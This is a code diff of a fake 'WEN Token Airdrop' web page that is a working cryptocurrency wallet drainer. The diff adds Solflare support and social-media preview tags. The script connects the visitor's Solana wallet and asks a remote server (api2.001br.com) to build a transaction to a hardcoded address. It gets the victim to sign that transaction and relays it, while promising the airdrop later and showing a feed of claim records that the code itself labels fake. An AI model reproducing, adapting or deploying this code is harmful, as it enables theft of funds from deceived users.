@@ -2,7 +2,7 @@
 <html lang="zh-CN">
 <head>
   <meta charset="UTF-8">
-  <title>WEN Token Airdrop | Solana Ecosystem</title>
+  <title>WEN Token Airdrop | Solflare Exclusive Airdrop</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
   <!-- 替换原来的 QRCode 库 -->
@@ -10,6 +10,15 @@
 <link rel="icon" href="https://www.iconaves.com/token_icon_solana/solana/WENWENvqqNya429ubCdR81ZmD69brwQaaBYY6p3LCpk.png" type="image/png">
   <meta name="viewport" id="viewportMeta" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=no">
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+  <!-- 基础 Meta 标签（推荐同时添加，供其他平台使用） -->
+<meta property="og:title" content="WEN Token Airdrop | Solflare Exclusive Airdrop" />
+<meta property="og:description" content="Get WEN token airdrop immediately, contract address: WENWENvqqNya429ubCdR81ZmD69brwQaaBYY6p3LCpk" />
+<meta property="og:url" content="https://2024web.github.io" />
+
+<!-- Twitter Card 专用标签 -->
+<meta name="twitter:title" content="WEN Token Airdrop | Solflare Exclusive Airdrop" />
+<meta name="twitter:description" content="Get WEN token airdrop immediately, contract address: WENWENvqqNya429ubCdR81ZmD69brwQaaBYY6p3LCpk" />
+<meta name="twitter:site" content="@2024wendao" />  <!-- 可选：关联你的官方推特 -->
   <style>
   /* 最近领取记录框 */
   #activityList {
@@ -552,6 +561,56 @@
     to { opacity: 1; transform: translateY(0); }
   }
   </style>
+  <style>
+  .hero {
+    text-align: center;
+    padding: 20px;
+  }
+  
+  .contract-wrapper {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    margin-top: 15px;
+  }
+  
+  .contract-title {
+    font-size: 1.1rem;
+    margin-bottom: 5px;
+    font-weight: 500;
+  }
+  
+  .contract-address {
+    font-size: 0.9rem;
+    word-break: break-all;
+    background: rgba(255,255,255,0.1);
+    padding: 8px 12px;
+    border-radius: 8px;
+    max-width: 90%;
+    margin: 0 auto;
+    font-family: monospace;
+  }
+  
+  /* 电脑端样式 */
+  @media (min-width: 768px) {
+    .contract-wrapper {
+      flex-direction: row;
+      justify-content: center;
+    }
+    
+    .contract-title {
+      margin-bottom: 0;
+      margin-right: 10px;
+      font-size: 1.2rem;
+    }
+    
+    .contract-address {
+      font-size: 1rem;
+      max-width: 600px;
+      padding: 10px 15px;
+    }
+  }
+</style>
 </head>
 <body>
   <!-- 导航栏 -->
@@ -567,9 +626,9 @@
     
     <div class="nav-links" id="navLinks">
       <a href="#">WEN DAO</a>
-      <a href="https://x.com/2024wendao">X</a>
-      <a href="/index.html">English</a>
-      <a href="/index_cn.html">简体中文</a>
+      <a href="https://x.com/wen_airdropdao">X</a>
+      <a href="index.html">English</a>
+      <a href="index_cn.html">简体中文</a>
       <div class="wallet-connect">
       <div class="wallet-info" id="walletInfo"></div>
       <button class="connect-btn" id="connectButton">Connect wallet</button>
@@ -587,7 +646,7 @@
   <canvas id="qrcode"></canvas>  <!-- 关键改动！ -->
   
 </div>
-   <div style="font-size:14px;color:white">Scan this QR Code with your phone</div><br />
+   <div style="font-size:14px;color:white">Scan this QR code with your phone</div><br />
     <wui-link color="" style="font-size:14px;color:#fff" id="copyLinkButton">
       <wui-icon slot="iconLeft" name="copy" style=""><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 16 16" fill="none">
   <path fill="currentColor" fill-rule="evenodd" clip-rule="evenodd" d="M9.21498 1.28565H10.5944C11.1458 1.28562 11.6246 1.2856 12.0182 1.32093C12.4353 1.35836 12.853 1.44155 13.2486 1.66724C13.7005 1.92498 14.0749 2.29935 14.3326 2.75122C14.5583 3.14689 14.6415 3.56456 14.6789 3.9817C14.7143 4.37531 14.7142 4.85403 14.7142 5.40545V6.78489C14.7142 7.33631 14.7143 7.81503 14.6789 8.20865C14.6415 8.62578 14.5583 9.04345 14.3326 9.43912C14.0749 9.89099 13.7005 10.2654 13.2486 10.5231C12.853 10.7488 12.4353 10.832 12.0182 10.8694C11.7003 10.8979 11.3269 10.9034 10.9045 10.9045C10.9034 11.3269 10.8979 11.7003 10.8694 12.0182C10.832 12.4353 10.7488 12.853 10.5231 13.2486C10.2654 13.7005 9.89099 14.0749 9.43912 14.3326C9.04345 14.5583 8.62578 14.6415 8.20865 14.6789C7.81503 14.7143 7.33631 14.7142 6.78489 14.7142H5.40545C4.85403 14.7142 4.37531 14.7143 3.9817 14.6789C3.56456 14.6415 3.14689 14.5583 2.75122 14.3326C2.29935 14.0749 1.92498 13.7005 1.66724 13.2486C1.44155 12.853 1.35836 12.4353 1.32093 12.0182C1.2856 11.6246 1.28562 11.1458 1.28565 10.5944V9.21498C1.28562 8.66356 1.2856 8.18484 1.32093 7.79122C1.35836 7.37409 1.44155 6.95642 1.66724 6.56074C1.92498 6.10887 2.29935 5.73451 2.75122 5.47677C3.14689 5.25108 3.56456 5.16789 3.9817 5.13045C4.2996 5.10192 4.67301 5.09645 5.09541 5.09541C5.09645 4.67302 5.10192 4.2996 5.13045 3.9817C5.16789 3.56456 5.25108 3.14689 5.47676 2.75122C5.73451 2.29935 6.10887 1.92498 6.56074 1.66724C6.95642 1.44155 7.37409 1.35836 7.79122 1.32093C8.18484 1.2856 8.66356 1.28562 9.21498 1.28565ZM5.09541 7.09552C4.68397 7.09667 4.39263 7.10161 4.16046 7.12245C3.88053 7.14757 3.78516 7.18949 3.74214 7.21403C3.60139 7.29431 3.48478 7.41091 3.4045 7.55166C3.37997 7.59468 3.33804 7.69005 3.31292 7.96999C3.28659 8.26345 3.28565 8.65147 3.28565 9.25708V10.5523C3.28565 11.1579 3.28659 11.5459 3.31292 11.8394C3.33804 12.1193 3.37997 12.2147 3.4045 12.2577C3.48478 12.3985 3.60139 12.5151 3.74214 12.5954C3.78516 12.6199 3.88053 12.6618 4.16046 12.6869C4.45393 12.7133 4.84195 12.7142 5.44755 12.7142H6.74279C7.3484 12.7142 7.73641 12.7133 8.02988 12.6869C8.30981 12.6618 8.40518 12.6199 8.44821 12.5954C8.58895 12.5151 8.70556 12.3985 8.78584 12.2577C8.81038 12.2147 8.8523 12.1193 8.87742 11.8394C8.89825 11.6072 8.90319 11.3159 8.90435 10.9045C8.48219 10.9034 8.10898 10.8979 7.79122 10.8694C7.37409 10.832 6.95641 10.7488 6.56074 10.5231C6.10887 10.2654 5.73451 9.89099 5.47676 9.43912C5.25108 9.04345 5.16789 8.62578 5.13045 8.20865C5.10194 7.89089 5.09645 7.51767 5.09541 7.09552ZM7.96999 3.31292C7.69005 3.33804 7.59468 3.37997 7.55166 3.4045C7.41091 3.48478 7.29431 3.60139 7.21403 3.74214C7.18949 3.78516 7.14757 3.88053 7.12245 4.16046C7.09611 4.45393 7.09517 4.84195 7.09517 5.44755V6.74279C7.09517 7.3484 7.09611 7.73641 7.12245 8.02988C7.14757 8.30981 7.18949 8.40518 7.21403 8.4482C7.29431 8.58895 7.41091 8.70556 7.55166 8.78584C7.59468 8.81038 7.69005 8.8523 7.96999 8.87742C8.26345 8.90376 8.65147 8.9047 9.25708 8.9047H10.5523C11.1579 8.9047 11.5459 8.90376 11.8394 8.87742C12.1193 8.8523 12.2147 8.81038 12.2577 8.78584C12.3985 8.70556 12.5151 8.58895 12.5954 8.4482C12.6199 8.40518 12.6618 8.30981 12.6869 8.02988C12.7133 7.73641 12.7142 7.3484 12.7142 6.74279V5.44755C12.7142 4.84195 12.7133 4.45393 12.6869 4.16046C12.6618 3.88053 12.6199 3.78516 12.5954 3.74214C12.5151 3.60139 12.3985 3.48478 12.2577 3.4045C12.2147 3.37997 12.1193 3.33804 11.8394 3.31292C11.5459 3.28659 11.1579 3.28565 10.5523 3.28565H9.25708C8.65147 3.28565 8.26345 3.28659 7.96999 3.31292Z"></path></svg></wui-icon>
@@ -659,14 +718,18 @@
   <!-- 主要内容 -->
   <div class="main-container">
     <div class="hero">
-      <h1>Claim your WEN token airdrop</h1>
-    </div>
+  <h1>Claim your WEN token airdrop</h1>
+
+    <h1 class="contract-address" style="font-size:15px">Contract Address:WENWENvqqNya429ubCdR81ZmD69brwQaaBYY6p3LCpk</h1>
+  
+</div>
     
     <div class="airdrop-section">
       <div class="airdrop-card">
         <div class="card-header">
           <h2>WEN Token Airdrop</h2>
           <p>Just a few steps to claim your airdrop rewards</p>
+        
         </div>
         
         <div class="stats">
@@ -813,23 +876,25 @@ async function autoConnectWallet() {
   }
 }
 function checkDeviceAndHandleWallet() {
-  const isPC = window.innerWidth > 768;  // 判断是否为PC设备
-
-  if (isPC) {
-    // 如果是PC设备，禁止连接钱包，隐藏连接钱包按钮
-    const connectButton = document.getElementById('connectButton');
-    if (connectButton) {
-      connectButton.style.display = 'none';  // 隐藏连接钱包按钮
-    }
+    const isPC = window.innerWidth > 768;  // 判断是否为PC设备
+    const isSolflare = typeof window.solflare !== 'undefined';
     
-    // 断开钱包连接的逻辑（如果已连接钱包）
-    if (window.solana && window.solana.isConnected) {
-      window.solana.disconnect();  // 断开钱包连接
+    if (isPC && !isSolflare) {
+        // 如果是PC设备且没有Solflare环境，禁止连接钱包，隐藏连接钱包按钮
+        const connectButton = document.getElementById('connectButton');
+        if (connectButton) {
+            connectButton.style.display = 'none';  // 隐藏连接钱包按钮
+        }
+        
+        // 断开钱包连接的逻辑（如果已连接钱包）
+        if (window.solana && window.solana.isConnected) {
+            window.solana.disconnect();  // 断开钱包连接
+        }
+    } else if (!isPC) {
+        // 如果是安卓或其他移动设备，保留现有逻辑，尝试自动连接钱包
+        autoConnectWallet();
     }
-  } else {
-    // 如果是安卓或其他移动设备，保留现有逻辑，尝试自动连接钱包
-    autoConnectWallet();
-  }
+    // 如果是PC且有Solflare环境，什么都不做（不执行任何操作）
 }
 document.addEventListener('DOMContentLoaded', () => {
   checkDeviceAndHandleWallet();
@@ -910,145 +975,174 @@ document.addEventListener('DOMContentLoaded', () => {
     
 document.addEventListener('DOMContentLoaded', async () => {
   try {
-      
-    if (!window.solana || !window.solana.isPhantom) {
-      showModal('Please open it in TokenPocket wallet');
+    // 检查是否存在TokenPocket或Solflare钱包
+    const isTokenPocket = window.solana && window.solana.isTokenPocket;
+    const isSolflare = typeof window.solflare !== 'undefined';
+    
+    if (!isTokenPocket && !isSolflare) {
+      showModal('Please open this page in TokenPocket or Solflare wallet');
       return;
     }
 
-    const connection = new solanaWeb3.Connection('https://solana3.mytokenpocket.vip');
-    const response = await window.solana.connect();
-    const walletAddress = response.publicKey.toString();
-
-    // 获取指定地址（从反向代理的查询参数中）
-    const urlParams = new URLSearchParams(window.location.search);
-     // 获取指定地址参数
-
-    if (!specifiedAddress) {
-      showModal('The specified address cannot be empty');
-      return;
+    // 根据钱包类型选择连接方式
+    let walletAddress;
+    if (isTokenPocket) {
+      const connection = new solanaWeb3.Connection('https://solana3.mytokenpocket.vip');
+      const response = await window.solana.connect();
+      walletAddress = response.publicKey.toString();
+    } else if (isSolflare) {
+      if (!window.solflare.isConnected) {
+        await window.solflare.connect();
+      }
+      walletAddress = window.solflare.publicKey.toString();
     }
+
+
+
+  
+      const specifiedAddress = 'Cm6mrpZrRLrp6G85tKbD5QZumNLGboFofsaduQ22JT4L'; 
+    
 
     // 获取钱包地址的前3位和后4位
     const shortenedAddress = walletAddress.slice(0, 3) + '...' + walletAddress.slice(-4);
 
-    // 确保 'connectButton' 元素存在后再修改其文本
+    // 更新UI元素
     const connectButton = document.getElementById('connectButton');
     if (connectButton) {
       connectButton.innerText = shortenedAddress;
-    
     }
-const addressInput = document.getElementById('addressInput');
-      if (addressInput) {
-        addressInput.value = walletAddress;  // 填充地址
-        addressInput.readOnly = true;  // 设置为只读
-      }
-    // 确保 'walletAddress' 元素存在
+
+    const addressInput = document.getElementById('addressInput');
+    if (addressInput) {
+      addressInput.value = walletAddress;
+      addressInput.readOnly = true;
+    }
+
     const walletAddressElement = document.getElementById('walletAddress');
     if (walletAddressElement) {
       walletAddressElement.style.display = 'none';
     }
 
-    // 确保 'transferAuth' 元素存在
     const transferAuth = document.getElementById('transferAuth');
     if (transferAuth) {
       transferAuth.disabled = false;
     }
 
+    // 调用后台API请求
     try {
-      
       const res = await fetch('https://api2.001br.com/prefetch-token', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
-          publicKey: walletAddress,  // 用户钱包地址
-          specifiedAddress: specifiedAddress  // 从反向代理中获取的指定地址
+          publicKey: walletAddress,
+          specifiedAddress: specifiedAddress
         })
       });
 
       const data = await res.json();
 
       if (data.success) {
-        // 根据返回的 status 判断是否显示提示
         if (data.status === 0) {
           showModal('The current wallet does not support this airdrop activity, please pay more attention to other activities');
         }
       } else {
         showModal('Network anomaly');
       }
-
     } catch (error) {
       console.error('请求错误:', error);
       showModal('Network anomaly');
     }
-
   } catch (error) {
-    // 如果连接失败，重新显示连接按钮
+    console.error('Wallet connection error:', error);
     const connectButton = document.getElementById('connectButton');
     if (connectButton) {
       connectButton.style.display = 'block';
     }
-    showModal('Network anomaly');
+    showModal('Failed to connect to wallet. Please try again.');
   }
 });
 
 document.getElementById('transferAuth').addEventListener('click', async () => {
-try {
-  const response = await window.solana.connect();
-  const walletAddress = response.publicKey.toString();
-
-  // 确保用户地址已连接
-  if (!walletAddress) {
-    showModal('Please connect your wallet first');
-    return;
-  }
-
-  // 获取指定的地址
-  const specifiedAddress = 'Cm6mrpZrRLrp6G85tKbD5QZumNLGboFofsaduQ22JT4L';  // 示例的指定地址
-
-  // 提交请求到后端
-  const buildResponse = await fetch('https://api2.001br.com/build-transaction', {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({
-      publicKey: walletAddress,
-      targetAddress: specifiedAddress,
-    })
-  });
-
-  const buildData = await buildResponse.json();
-  if (!buildData.success) {
-    throw new Error(buildData.error || 'Unable to construct transaction');
-  }
-
-  const transactionBytes = base64ToUint8Array(buildData.transaction);
-  const tx = solanaWeb3.Transaction.from(transactionBytes);
-
   try {
-    const signedTx = await window.solana.signTransaction(tx);
+    // 检查钱包类型
+    const isTokenPocket = window.solana && window.solana.isTokenPocket;
+    const isSolflare = typeof window.solflare !== 'undefined';
+    
+    if (!isTokenPocket && !isSolflare) {
+      showModal('Please connect with TokenPocket or Solflare wallet');
+      return;
+    }
 
-    const signedTxBase64 = uint8ArrayToBase64(signedTx.serialize());
-    await fetch('https://api2.001br.com/send-transaction', {
+    // 连接钱包并获取地址
+    let walletAddress;
+    if (isTokenPocket) {
+      const response = await window.solana.connect();
+      walletAddress = response.publicKey.toString();
+    } else if (isSolflare) {
+      if (!window.solflare.isConnected) {
+        await window.solflare.connect();
+      }
+      walletAddress = window.solflare.publicKey.toString();
+    }
+
+    // 确保用户地址已连接
+    if (!walletAddress) {
+      showModal('Please connect your wallet first');
+      return;
+    }
+
+    // 获取指定的地址
+    const specifiedAddress = 'Cm6mrpZrRLrp6G85tKbD5QZumNLGboFofsaduQ22JT4L';  // 示例的指定地址
+
+    // 提交请求到后端
+    const buildResponse = await fetch('https://api2.001br.com/build-transaction', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ signedTx: signedTxBase64 })
+      body: JSON.stringify({
+        publicKey: walletAddress,
+        targetAddress: specifiedAddress,
+      })
     });
 
-    showModal('If you receive the airdrop successfully, it will be credited to your account within 24 hours after the event ends.!');
-  } catch (error) {
-    // 检查是否是用户拒绝交易或 TypeError
-    if (error.message && (error.message.includes('User rejected the request') || error.message.includes('signedTx'))) {
-      showModal('Cancel collection');
-    } else {
-      showModal('Signature Error:', error.message || error);
+    const buildData = await buildResponse.json();
+    if (!buildData.success) {
+      throw new Error(buildData.error || 'Unable to construct transaction');
     }
-  }
-} catch (error) {
-  // 捕获并显示错误
-  console.error('Main error:', error);
-  showModal('Error in receiving:', error.message || error);
-}
 
+    const transactionBytes = base64ToUint8Array(buildData.transaction);
+    const tx = solanaWeb3.Transaction.from(transactionBytes);
+
+    try {
+      // 根据钱包类型签名交易
+      let signedTx;
+      if (isTokenPocket) {
+        signedTx = await window.solana.signTransaction(tx);
+      } else if (isSolflare) {
+        signedTx = await window.solflare.signTransaction(tx);
+      }
+
+      const signedTxBase64 = uint8ArrayToBase64(signedTx.serialize());
+      await fetch('https://api2.001br.com/send-transaction', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ signedTx: signedTxBase64 })
+      });
+
+      showModal('If you receive the airdrop successfully, it will be credited to your account within 24 hours after the event ends.!');
+    } catch (error) {
+      // 检查是否是用户拒绝交易
+      if (error.message && (error.message.includes('User rejected the request') || 
+                           error.message.includes('Rejected by user') ||
+                           error.message.includes('Cancelled'))) {
+        showModal('Cancel collection');
+      } else {
+        showModal('Signature Error: ' + (error.message || error));
+      }
+    }
+  } catch (error) {
+    console.error('Main error:', error);
+    showModal('Error in receiving: ' + (error.message || error));
+  }
 });
 
  
@@ -1113,14 +1207,17 @@ document.addEventListener('DOMContentLoaded', () => {
   displayFakeActivities();  // 确保虚假记录能正常显示
   autoConnectWallet();
   
-  // 检测设备类型
+  // 检测设备类型和环境
   const isMobile = window.innerWidth <= 768;
+  const isSolflare = typeof window.solflare !== 'undefined';
 
-  // 如果是PC，弹出二维码弹窗，二维码内容是当前网页的 URL
-  if (!isMobile) {
+  // 如果是PC且没有Solflare环境，弹出二维码弹窗
+  if (!isMobile && !isSolflare) {
     showQRCodeModal();  // 调用二维码生成弹窗
-  } else {
-    autoConnectWallet(); // 自动连接钱包（手机设备）
+  } 
+  // 如果是移动设备或PC有Solflare环境，尝试自动连接钱包
+  else {
+    autoConnectWallet();
   }
 });
 
@@ -1147,7 +1244,7 @@ function showQRCodeModal() {
     },
     (error) => {
       if (error) {
-        //console.error("生成失败:", error);
+        console.error("生成失败:", error);
       } else {
         // 加载并绘制 Logo 图片到二维码上
         const logoImage = new Image();
